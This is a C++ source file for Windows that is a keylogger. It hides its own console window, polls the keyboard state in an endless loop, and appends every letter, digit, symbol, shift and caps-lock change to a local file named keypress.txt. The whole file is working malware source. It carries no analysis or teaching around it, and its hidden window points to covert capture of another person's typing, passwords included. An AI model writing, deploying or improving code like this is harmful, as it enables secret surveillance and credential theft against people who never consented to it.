#include <iostream>
#include <Windows.h>
#include <WinUser.h>
#include <fstream>
using namespace std;

bool cps, shift;

char symbol2(char key) {
	if (shift) {
		if (key == '=')
			return '+';
		else if (key == '-')
			return '_';
		else if (key == '[')
			return '{';
		else if (key == '\\')
			return '|';
		else if (key == ']')
			return '}';
		else if (key == '`')
			return '~';
		else if (key == ';')
			return ':';
		else if (key == '/')
			return '?';
		else if (key == ',')
			return '<';
		else if (key == '.')
			return '>';
		else if (key == '\'')
			return '\"';
		else if (key == VK_SPACE)
			return ' ';
	}
	else
		return key;
}

char symbol(char key) {
	if (shift) {
		if (key == '0')
			return ')';
		else if (key == '1')
			return '!';
		else if (key == '2')
			return '@';
		else if (key == '3')
			return '#';
		else if (key == '4')
			return '$';
		else if (key == '5')
			return '%';
		else if (key == '6')
			return '^';
		else if (key == '7')
			return '&';
		else if (key == '8')
			return '*';
		else if (key == '9')
			return '(';
	}
	else
		return key;
}

char up_low(char letter) {
	if ((cps && !shift) || (!cps && shift))
		return toupper(letter);
	return tolower(letter);
}


int main() {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	ofstream writer("keypress.txt", ios::app);
	cps = shift = false;
	while (1) {
		if (GetAsyncKeyState(0x10) == -32768 && shift == false) {
			//cout << "Shift Held Down" << endl;
			writer << "Shift Held Down" << endl;
			shift = true;
		}
		else if (GetAsyncKeyState(0x10) != -32768 && shift == true) {
			//cout << "Shift Is Released" << endl;
			writer << "Shift Is Released" << endl;
			shift = false;
		}
		if (GetKeyState(0x14) & 0x01 && cps == false) {
			//cout << "Capslock Is On" << endl;
			writer << "Capslock Is On" << endl;
			cps = true;
		}
		else if ((GetKeyState(0x14) & 0x01) == 0 && cps == true) {
			//cout << "Capslock Turned Off" << endl;
			writer << "Capslock Turned Off" << endl;
			cps = false;
		}
		if (GetAsyncKeyState(0x30) & 0x01) {
			//cout << symbol('0') << endl;
			writer << symbol('0') << endl;
		}
		else if (GetAsyncKeyState(0x31) & 0x01) {
			//cout << symbol('1') << endl;
			writer << symbol('1') << endl;
		}
		else if (GetAsyncKeyState(0x32) & 0x01) {
			//cout << symbol('2') << endl;
			writer << symbol('2') << endl;
		}
		else if (GetAsyncKeyState(0x33) & 0x01) {
			//cout << symbol('3') << endl;
			writer << symbol('3') << endl;
		}
		else if (GetAsyncKeyState(0x34) & 0x01) {
			//cout << symbol('4') << endl;
			writer << symbol('4') << endl;
		}
		else if (GetAsyncKeyState(0x35) & 0x01) {
			//cout << symbol('5') << endl;
			writer << symbol('5') << endl;
		}
		else if (GetAsyncKeyState(0x36) & 0x01) {
			//cout << symbol('6') << endl;
			writer << symbol('6') << endl;
		}
		else if (GetAsyncKeyState(0x37) & 0x01) {
			//cout << symbol('7') << endl;
			writer << symbol('7') << endl;
		}
		else if (GetAsyncKeyState(0x38) & 0x01) {
			//cout << symbol('8') << endl;
			writer << symbol('8') << endl;
		}
		else if (GetAsyncKeyState(0x39) & 0x01) {
			//cout << symbol('9') << endl;
			writer << symbol('9') << endl;
		}
		else if (GetAsyncKeyState(0x41) & 0x01) {
			//cout << up_low('a') << endl;
			writer << up_low('a') << endl;
		}
		else if (GetAsyncKeyState(0x42) & 0x01) {
			//cout << up_low('b') << endl;
			writer << up_low('b') << endl;
		}
		else if (GetAsyncKeyState(0x43) & 0x01) {
			//cout << up_low('c') << endl;
			writer << up_low('c') << endl;
		}
		else if (GetAsyncKeyState(0x44) & 0x01) {
			//cout << up_low('d') << endl;
			writer << up_low('d') << endl;
		}
		else if (GetAsyncKeyState(0x45) & 0x01) {
			//cout << up_low('e') << endl;
			writer << up_low('e') << endl;
		}
		else if (GetAsyncKeyState(0x46) & 0x01) {
			//cout << up_low('f') << endl;
			writer << up_low('f') << endl;
		}
		else if (GetAsyncKeyState(0x47) & 0x01) {
			//cout << up_low('g') << endl;
			writer << up_low('g') << endl;
		}
		else if (GetAsyncKeyState(0x48) & 0x01) {
			//cout << up_low('h') << endl;
			writer << up_low('h') << endl;
		}
		else if (GetAsyncKeyState(0x49) & 0x01) {
			//cout << up_low('i') << endl;
			writer << up_low('i') << endl;
		}
		else if (GetAsyncKeyState(0x4A) & 0x01) {
			//cout << up_low('j') << endl;
			writer << up_low('j') << endl;
		}
		else if (GetAsyncKeyState(0x4B) & 0x01) {
			//cout << up_low('k') << endl;
			writer << up_low('k') << endl;
		}
		else if (GetAsyncKeyState(0x4C) & 0x01) {
			//cout << up_low('l') << endl;
			writer << up_low('l') << endl;
		}
		else if (GetAsyncKeyState(0x4D) & 0x01) {
			//cout << up_low('m') << endl;
			writer << up_low('m') << endl;
		}
		else if (GetAsyncKeyState(0x4E) & 0x01) {
			//cout << up_low('n') << endl;
			writer << up_low('n') << endl;
		}
		else if (GetAsyncKeyState(0x4F) & 0x01) {
			//cout << up_low('o') << endl;
			writer << up_low('o') << endl;
		}
		else if (GetAsyncKeyState(0x50) & 0x01) {
			//cout << up_low('p') << endl;
			writer << up_low('p') << endl;
		}
		else if (GetAsyncKeyState(0x51) & 0x01) {
			//cout << up_low('q') << endl;
			writer << up_low('q') << endl;
		}
		else if (GetAsyncKeyState(0x52) & 0x01) {
			//cout << up_low('r') << endl;
			writer << up_low('r') << endl;
		}
		else if (GetAsyncKeyState(0x53) & 0x01) {
			//cout << up_low('s') << endl;
			writer << up_low('s') << endl;
		}
		else if (GetAsyncKeyState(0x54) & 0x01) {
			//cout << up_low('t') << endl;
			writer << up_low('t') << endl;
		}
		else if (GetAsyncKeyState(0x55) & 0x01) {
			//cout << up_low('u') << endl;
			writer << up_low('u') << endl;
		}
		else if (GetAsyncKeyState(0x56) & 0x01) {
			//cout << up_low('v') << endl;
			writer << up_low('v') << endl;
		}
		else if (GetAsyncKeyState(0x57) & 0x01) {
			//cout << up_low('w') << endl;
			writer << up_low('w') << endl;
		}
		else if (GetAsyncKeyState(0x58) & 0x01) {
			//cout << up_low('x') << endl;
			writer << up_low('x') << endl;
		}
		else if (GetAsyncKeyState(0x59) & 0x01) {
			//cout << up_low('y') << endl;
			writer << up_low('y') << endl;
		}
		else if (GetAsyncKeyState(0x5A) & 0x01) {
			//cout << up_low('z') << endl;
			writer << up_low('z') << endl;
		}
		else if (GetAsyncKeyState(VK_OEM_MINUS) & 0x01) {
		//cout << symbol2('-') << endl;
		writer << symbol2('-') << endl;
		}
		else if (GetAsyncKeyState(VK_OEM_PLUS) & 0x01) {
		//cout << symbol2('=') << endl;
		writer << symbol2('=') << endl;
		}
		else if (GetAsyncKeyState(VK_OEM_1) & 0x01) {
		//cout << symbol2(';') << endl;
		writer << symbol2(';') << endl;
		}
		else if (GetAsyncKeyState(VK_OEM_2) & 0x01) {
		//cout << symbol2('/') << endl;
		writer << symbol2('/') << endl;
		}
		else if (GetAsyncKeyState(VK_OEM_3) & 0x01) {
		//cout << symbol2('`') << endl;
		writer << symbol2('`') << endl;
		}
		else if (GetAsyncKeyState(VK_OEM_4) & 0x01) {
		//cout << symbol2('[') << endl;
		writer << symbol2('[') << endl;
		}
		else if (GetAsyncKeyState(VK_OEM_5) & 0x01) {
		//cout << symbol2('\\') << endl;
		writer << symbol2('\\') << endl;
		}
		else if (GetAsyncKeyState(VK_OEM_6) & 0x01) {
		//cout << symbol2(']') << endl;
		writer << symbol2(']') << endl;
		}
		else if (GetAsyncKeyState(0xBC) & 0x01) {
		//cout << symbol2(',') << endl;
		writer << symbol2(',') << endl;
		}
		else if (GetAsyncKeyState(0xBE) & 0x01) {
		//cout << symbol2('.') << endl;
		writer << symbol2('.') << endl;
		}
		else if (GetAsyncKeyState(VK_SPACE) & 0x01) {
		//cout << symbol2(32) << endl;
		writer << symbol2(32) << endl;
		}
		else if (GetAsyncKeyState(VK_OEM_7) & 0x01) {
		//cout << symbol2('\'') << endl;
		writer << symbol2('\'') << endl;
		}
		else if (GetAsyncKeyState(VK_BACK) & 0x01) {
		//cout << "backspace pressed" << endl;
		writer << "backspace pressed" << endl;
		}
	}
	writer.close();
	return 0;
}